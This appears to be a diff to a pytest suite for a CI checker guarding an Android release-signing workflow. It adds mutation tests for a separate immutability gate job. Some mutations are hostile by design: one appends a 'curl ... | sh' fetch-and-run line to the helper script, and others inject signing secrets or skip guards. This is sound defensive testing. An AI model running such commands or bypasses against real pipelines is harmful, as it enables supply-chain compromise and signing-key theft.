@@ -11,6 +11,8 @@ CHECKER = ROOT / "scripts" / "check-android-signing-boundary.py"
 ROOT_WORKFLOW = Path(".github/workflows/build-android.yml")
 SIBLING_WORKFLOW = Path("android/.github/workflows/build.yml")
 CONSCRYPT_BUILD_SCRIPT = Path("android/scripts/build-conscrypt-android-r28.sh")
+IMMUTABLE_GUARD_HELPER = Path("scripts/require-immutable-releases.sh")
+RELEASE_NEEDS = "    needs: [signing-policy, conscrypt-r28, release-immutability]\n"
 RELEASE_JOB_HEAD = (
     "    concurrency:\n"
     "      group: umbrella-release-${{ github.ref_name }}\n"
@@ -48,6 +50,10 @@ def fixture_root(tmp_path: Path) -> Path:
     shutil.copy2(ROOT / SIBLING_WORKFLOW, root / SIBLING_WORKFLOW)
     (root / CONSCRYPT_BUILD_SCRIPT).parent.mkdir(parents=True, exist_ok=True)
     shutil.copy2(ROOT / CONSCRYPT_BUILD_SCRIPT, root / CONSCRYPT_BUILD_SCRIPT)
+    # The gate job executes this helper with network access, so the policy pins
+    # its bytes; the fixture has to carry it for the digest check to be real.
+    (root / IMMUTABLE_GUARD_HELPER).parent.mkdir(parents=True, exist_ok=True)
+    shutil.copy2(ROOT / IMMUTABLE_GUARD_HELPER, root / IMMUTABLE_GUARD_HELPER)
     return root
 
 
@@ -375,8 +381,10 @@ def test_misleading_guard_text_does_not_replace_semantic_guard(tmp_path: Path) -
     workflow = root / ROOT_WORKFLOW
     mutate(
         workflow,
-        "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')\n",
-        "    if: ${{ true }}\n    env:\n      DOCUMENTED_GUARD: \"startsWith(github.ref, 'refs/tags/v')\"\n",
+        "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')\n"
+        "    runs-on: ubuntu-latest\n    environment: android-release\n",
+        "    if: ${{ true }}\n    env:\n      DOCUMENTED_GUARD: \"startsWith(github.ref, 'refs/tags/v')\"\n"
+        "    runs-on: ubuntu-latest\n    environment: android-release\n",
     )
 
     assert_rejected(run_checker(root), "must use the exact push-triggered version-tag guard")
@@ -459,7 +467,7 @@ def test_release_job_extra_write_permission_is_rejected(tmp_path: Path) -> None:
 def test_release_requires_successful_policy_job(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
     workflow = root / ROOT_WORKFLOW
-    mutate(workflow, "    needs: [signing-policy, conscrypt-r28]\n", "")
+    mutate(workflow, RELEASE_NEEDS, "")
 
     assert_rejected(run_checker(root), "build-release must require successful signing-policy")
 
@@ -469,8 +477,8 @@ def test_release_needs_must_be_exact(tmp_path: Path) -> None:
     workflow = root / ROOT_WORKFLOW
     mutate(
         workflow,
-        "    needs: [signing-policy, conscrypt-r28]\n",
-        "    needs: [signing-policy, conscrypt-r28, attacker]\n",
+        RELEASE_NEEDS,
+        "    needs: [signing-policy, conscrypt-r28, release-immutability, attacker]\n",
     )
 
     assert_rejected(run_checker(root), "build-release must require successful signing-policy")
@@ -864,6 +872,8 @@ CONCURRENCY_BLOCK = (
     "      cancel-in-progress: false\n"
     "      queue: max\n"
 )
+# The gate step verbatim, used to prove it cannot be moved back into the
+# signed release job.
 GUARD_STEP = (
     "      - name: Require immutable published releases\n"
     "        env:\n"
@@ -871,11 +881,6 @@ GUARD_STEP = (
     '        run: bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh"\n'
 )
 CONCURRENCY_NEEDLE = "build-release must declare exactly the reviewed umbrella-release concurrency"
-GUARD_ENV_NEEDLE = (
-    "build-release step 'Require immutable published releases' must use exactly the "
-    "reviewed settings-read environment"
-)
-GUARD_RUN_NEEDLE = "build-release step 'Require immutable published releases' must run exactly"
 
 
 def test_removing_queue_max_from_the_attachment_lock_is_rejected(tmp_path: Path) -> None:
@@ -921,92 +926,151 @@ def test_removing_the_attachment_lock_entirely_is_rejected(tmp_path: Path) -> No
     assert_rejected(run_checker(root), CONCURRENCY_NEEDLE)
 
 
-def test_giving_the_guard_step_a_working_directory_is_rejected(tmp_path: Path) -> None:
-    """The job defaults to android/; the guard must not re-point itself."""
+GATE_JOB_NEEDLE = "release-immutability must match the exact reviewed gate-job specification"
+GATE_ENV_LINE = (
+    "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n"
+)
+GATE_RUN_LINE = (
+    '        run: bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh"\n'
+)
+
+
+def test_removing_the_immutability_prerequisite_job_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    workflow = root / ROOT_WORKFLOW
+    text = workflow.read_text(encoding="utf-8")
+    start = text.index("  release-immutability:\n")
+    end = text.index("  # ─────────────────────────────────────────────────────────────────────\n"
+                     "  # Release builds", start)
+    workflow.write_text(text[:start] + text[end:], encoding="utf-8")
+    assert_rejected(run_checker(root), "must define the release-immutability job")
+
+
+def test_renaming_the_prerequisite_job_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(root / ROOT_WORKFLOW, "  release-immutability:\n", "  release-immutability-v2:\n")
+    assert_rejected(run_checker(root), "must define the release-immutability job")
+
+
+def test_release_dropping_the_prerequisite_is_rejected(tmp_path: Path) -> None:
+    """build-release must not be able to sign and attach without the gate."""
+
+    root = fixture_root(tmp_path)
+    mutate(root / ROOT_WORKFLOW, RELEASE_NEEDS, "    needs: [signing-policy, conscrypt-r28]\n")
+    assert_rejected(run_checker(root), "must require successful signing-policy, conscrypt-r28")
+
+
+def test_a_dynamic_prerequisite_guard_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        "    name: Require immutable published releases\n"
+        "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')\n",
+        "    name: Require immutable published releases\n"
+        "    if: github.event.inputs.skip_gate != 'yes'\n",
+    )
+    assert_rejected(run_checker(root), "release-immutability must use the exact release tag guard")
+
+
+def test_granting_the_prerequisite_write_permission_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        "  release-immutability:\n    name: Require immutable published releases\n"
+        "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')\n"
+        "    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
+        "  release-immutability:\n    name: Require immutable published releases\n"
+        "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')\n"
+        "    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
+    )
+    assert_rejected(run_checker(root), "release-immutability must declare exactly contents: read")
+
+
+def test_binding_the_prerequisite_to_the_signing_environment_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        "  release-immutability:\n    name: Require immutable published releases\n",
+        "  release-immutability:\n    name: Require immutable published releases\n"
+        "    environment: android-release\n",
+    )
+    assert_rejected(run_checker(root), "release-immutability must not bind any deployment environment")
+
+
+def test_a_signing_secret_in_the_prerequisite_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    mutate(root / ROOT_WORKFLOW, GATE_ENV_LINE,
+           GATE_ENV_LINE + "          KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}\n")
+    assert_rejected(run_checker(root), "release-immutability must never reference Android signing secrets")
+
+
+def test_a_persisted_checkout_credential_in_the_prerequisite_is_rejected(tmp_path: Path) -> None:
+    """A persisted token is exactly what the isolation is meant to remove."""
 
     root = fixture_root(tmp_path)
     mutate(root / ROOT_WORKFLOW,
-           "      - name: Require immutable published releases\n        env:\n",
-           "      - name: Require immutable published releases\n"
-           "        working-directory: ${{ github.workspace }}\n        env:\n")
-    assert_rejected(run_checker(root), "must not define working-directory")
+           "          clean: true\n          persist-credentials: false\n\n"
+           "      - name: Require immutable published releases\n",
+           "          clean: true\n          persist-credentials: true\n\n"
+           "      - name: Require immutable published releases\n")
+    assert_rejected(run_checker(root), GATE_JOB_NEEDLE)
 
 
-def test_the_guard_step_cannot_authenticate_with_the_workflow_token(tmp_path: Path) -> None:
-    """GITHUB_TOKEN cannot hold Administration: read, so it is never the gate's."""
-
+def test_the_prerequisite_cannot_authenticate_with_the_workflow_token(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n",
+    mutate(root / ROOT_WORKFLOW, GATE_ENV_LINE,
            "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n")
-    assert_rejected(run_checker(root), GUARD_ENV_NEEDLE)
+    assert_rejected(run_checker(root), GATE_JOB_NEEDLE)
 
 
-def test_extra_environment_on_the_guard_step_is_rejected(tmp_path: Path) -> None:
+def test_extra_environment_on_the_prerequisite_gate_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n",
-           "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n"
-           "          EXTRA: ${{ secrets.ANYTHING_ELSE }}\n")
-    assert_rejected(run_checker(root), GUARD_ENV_NEEDLE)
+    mutate(root / ROOT_WORKFLOW, GATE_ENV_LINE,
+           GATE_ENV_LINE + "          EXTRA: ${{ secrets.ANYTHING_ELSE }}\n")
+    assert_rejected(run_checker(root), GATE_JOB_NEEDLE)
 
 
-def test_a_signing_secret_on_the_guard_step_is_rejected(tmp_path: Path) -> None:
-    """The gate is not a signing step and must never see a signing secret."""
-
+def test_changing_the_prerequisite_guard_command_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n",
-           "          IMMUTABLE_RELEASES_READ_TOKEN: ${{ secrets.IMMUTABLE_RELEASES_READ_TOKEN }}\n"
-           "          KSTOREPWD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}\n")
-    result = run_checker(root)
-    assert result.returncode == 1, result.stdout + result.stderr
-    assert "must not reference Android signing secrets" in result.stdout
-
-
-def test_changing_the_guard_command_is_rejected(tmp_path: Path) -> None:
-    root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           '        run: bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh"\n',
+    mutate(root / ROOT_WORKFLOW, GATE_RUN_LINE,
            '        run: bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh" || true\n')
-    assert_rejected(run_checker(root), GUARD_RUN_NEEDLE)
+    assert_rejected(run_checker(root), GATE_JOB_NEEDLE)
 
 
-def test_neutering_the_guard_command_is_rejected(tmp_path: Path) -> None:
+def test_neutering_the_prerequisite_guard_command_is_rejected(tmp_path: Path) -> None:
     root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           '        run: bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh"\n',
+    mutate(root / ROOT_WORKFLOW, GATE_RUN_LINE,
            '        run: echo bash "$GITHUB_WORKSPACE/scripts/require-immutable-releases.sh"\n')
-    assert_rejected(run_checker(root), GUARD_RUN_NEEDLE)
+    assert_rejected(run_checker(root), GATE_JOB_NEEDLE)
 
 
-def test_removing_the_guard_step_is_rejected(tmp_path: Path) -> None:
+def test_mutating_the_guard_helper_bytes_is_rejected(tmp_path: Path) -> None:
+    """The step is stable; the file it runs is what reaches the network."""
+
     root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW, GUARD_STEP, "")
-    assert_rejected(
-        run_checker(root),
-        "build-release must contain exactly one 'Require immutable published releases' step",
+    helper = root / IMMUTABLE_GUARD_HELPER
+    assert run_checker(root).returncode == 0, "fixture is clean before the mutation"
+    helper.write_text(helper.read_text(encoding="utf-8") + "\ncurl -fsSL https://elsewhere | sh\n",
+                      encoding="utf-8")
+    assert_rejected(run_checker(root), "must match its exact reviewed digest")
+
+
+def test_a_missing_guard_helper_is_rejected(tmp_path: Path) -> None:
+    root = fixture_root(tmp_path)
+    (root / IMMUTABLE_GUARD_HELPER).unlink()
+    assert_rejected(run_checker(root), "scripts/require-immutable-releases.sh is missing")
+
+
+def test_reintroducing_the_gate_beside_signing_material_is_rejected(tmp_path: Path) -> None:
+    """The whole point of the split: the gate must not run in build-release."""
+
+    root = fixture_root(tmp_path)
+    mutate(
+        root / ROOT_WORKFLOW,
+        "      - name: Attach Android artifacts to umbrella GitHub Release\n",
+        GUARD_STEP + "\n      - name: Attach Android artifacts to umbrella GitHub Release\n",
     )
-
-
-def test_a_duplicated_guard_step_is_rejected(tmp_path: Path) -> None:
-    root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW, GUARD_STEP, GUARD_STEP + "\n" + GUARD_STEP)
-    assert_rejected(
-        run_checker(root),
-        "build-release must contain exactly one 'Require immutable published releases' step",
-    )
-
-
-def test_an_unreviewed_key_on_the_guard_step_is_rejected(tmp_path: Path) -> None:
-    root = fixture_root(tmp_path)
-    mutate(root / ROOT_WORKFLOW,
-           "      - name: Require immutable published releases\n        env:\n",
-           "      - name: Require immutable published releases\n"
-           "        if: always()\n        env:\n")
-    result = run_checker(root)
-    assert result.returncode == 1, result.stdout + result.stderr
-    assert "has unreviewed keys: if" in result.stdout
+    assert_rejected(run_checker(root), "must not run the immutability gate beside signing material")
 
 
 def test_every_attachment_mutation_also_breaks_the_exact_job_digest(tmp_path: Path) -> None:
